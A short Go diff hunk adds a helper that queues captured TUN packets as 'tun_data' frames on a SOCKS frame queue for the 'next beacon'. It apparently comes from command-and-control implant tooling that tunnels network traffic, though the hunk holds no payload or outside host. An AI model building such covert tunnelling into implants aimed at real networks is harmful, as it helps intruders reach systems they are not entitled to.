@@ -72,6 +72,12 @@ func tunReadLoop(f *os.File) {
 	}
 }
 
+// tunEnqueue queues one captured TUN packet for the next beacon (a tun_data
+// frame; plain bytes over the socks frame queue, no envelope needed).
+func tunEnqueue(pkt []byte) {
+	socksEnqueueOut(0, "tun_data", pkt)
+}
+
 func tunWritePacket(pkt []byte) {
 	if tunFile == nil || len(pkt) == 0 {
 		return
